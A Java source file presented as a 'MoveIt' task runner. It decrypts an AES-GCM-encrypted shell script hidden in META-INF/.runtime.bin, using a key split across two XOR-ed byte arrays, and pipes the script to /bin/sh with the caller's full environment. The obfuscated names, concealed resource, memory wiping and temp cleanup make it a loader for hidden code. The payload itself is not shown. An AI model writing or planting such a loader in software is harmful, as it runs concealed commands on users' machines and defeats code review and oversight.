package com.example.moveit;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.PosixFilePermission;
import java.security.GeneralSecurityException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.EnumSet;
import java.util.List;
import java.util.Map;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/** Dependency-free launcher for the encrypted in-memory shell payload. */
public final class MoveItTaskRunner {
    private static final int E = 9;
    private static final String R = "META-INF/.runtime.bin";
    private static final byte[] A = new byte[]{
            0x31, 0x72, 0x19, 0x5a, 0x2c, 0x67, 0x0d, 0x44,
            0x6e, 0x21, 0x53, 0x08, 0x7a, 0x15, 0x3f, 0x62
    };
    private static final byte[] B = new byte[]{
            0x58, 0x04, 0x6d, 0x33, 0x49, 0x13, 0x78, 0x2a,
            0x0b, 0x55, 0x26, 0x7c, 0x1f, 0x60, 0x4a, 0x17
    };
    private static final byte[] D = new byte[]{
            0x74, 0x69, 0x6e, 0x79, 0x2d, 0x6d, 0x6f, 0x76, 0x65, 0x69, 0x74
    };

    private MoveItTaskRunner() {
    }

    public static void main(String[] args) {
        System.exit(run(args, System.getenv(), true));
    }

    static int run(String[] args, Map<String, String> environment) {
        return run(args, environment, true);
    }

    static int run(String[] args, Map<String, String> environment, boolean inheritIo) {
        Path w = null;
        byte[] script = null;
        try {
            w = Files.createTempDirectory("moveit-runtime-");
            p(w);
            script = d();

            String shell = environment.get("MOVEIT_SHELL");
            if (shell == null || shell.trim().isEmpty()) {
                shell = "/bin/sh";
            }

            List<String> command = new ArrayList<String>();
            command.add(shell);
            command.add("-s");
            command.add("--");
            command.addAll(Arrays.asList(args));

            ProcessBuilder builder = new ProcessBuilder(command);
            builder.environment().putAll(environment);
            builder.environment().put("MOVEIT_SHELL_HOME", w.toString());
            if (inheritIo) {
                builder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                builder.redirectError(ProcessBuilder.Redirect.INHERIT);
            } else {
                builder.redirectOutput(w.resolve("test-stdout.log").toFile());
                builder.redirectError(w.resolve("test-stderr.log").toFile());
            }

            Process process = builder.start();
            OutputStream input = process.getOutputStream();
            try {
                input.write(script);
                input.flush();
            } finally {
                input.close();
            }
            return process.waitFor();
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            f("Shell process was interrupted");
            return E;
        } catch (IOException exception) {
            f("Unable to start protected shell payload: " + exception.getMessage());
            return E;
        } finally {
            if (script != null) {
                Arrays.fill(script, (byte) 0);
            }
            x(w);
        }
    }

    private static byte[] d() throws IOException {
        byte[] encrypted = null;
        byte[] key = null;
        InputStream input = MoveItTaskRunner.class.getClassLoader().getResourceAsStream(R);
        if (input == null) {
            throw new IOException("Protected runtime payload is missing");
        }
        try {
            encrypted = r(input);
            if (encrypted.length <= 28) {
                throw new IOException("Protected runtime payload is invalid");
            }
            byte[] iv = Arrays.copyOfRange(encrypted, 0, 12);
            byte[] body = Arrays.copyOfRange(encrypted, 12, encrypted.length);
            key = k();
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                    new GCMParameterSpec(128, iv));
            cipher.updateAAD(D);
            return cipher.doFinal(body);
        } catch (GeneralSecurityException exception) {
            throw new IOException("Protected runtime payload cannot be decrypted");
        } finally {
            try {
                input.close();
            } finally {
                if (encrypted != null) {
                    Arrays.fill(encrypted, (byte) 0);
                }
                if (key != null) {
                    Arrays.fill(key, (byte) 0);
                }
            }
        }
    }

    private static byte[] r(InputStream input) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int count;
        while ((count = input.read(buffer)) != -1) {
            output.write(buffer, 0, count);
        }
        Arrays.fill(buffer, (byte) 0);
        return output.toByteArray();
    }

    private static byte[] k() {
        byte[] key = new byte[A.length];
        for (int i = 0; i < key.length; i++) {
            key[i] = (byte) (A[i] ^ B[i]);
        }
        return key;
    }

    private static void p(Path directory) {
        try {
            Files.setPosixFilePermissions(directory, EnumSet.of(
                    PosixFilePermission.OWNER_READ,
                    PosixFilePermission.OWNER_WRITE,
                    PosixFilePermission.OWNER_EXECUTE));
        } catch (IOException ignored) {
            // createTempDirectory already uses platform defaults when POSIX permissions fail.
        } catch (UnsupportedOperationException ignored) {
            // Non-POSIX build/test hosts do not expose POSIX file permissions.
        }
    }

    private static void x(Path root) {
        if (root == null || !Files.exists(root)) {
            return;
        }
        try {
            Files.walkFileTree(root, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs)
                        throws IOException {
                    Files.deleteIfExists(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path directory, IOException exception)
                        throws IOException {
                    if (exception != null) {
                        throw exception;
                    }
                    Files.deleteIfExists(directory);
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException ignored) {
            // Runtime cleanup must not replace the shell module's exit code.
        }
    }

    private static void f(String message) {
        String safe = message == null ? "" : message.replace("\\", "\\\\")
                .replace("\"", "\\\"").replace("\r", " ").replace("\n", " ");
        System.out.println("{\"result\":\"FAILURE\",\"exitCode\":9,\"message\":\""
                + safe + "\"}");
    }
}
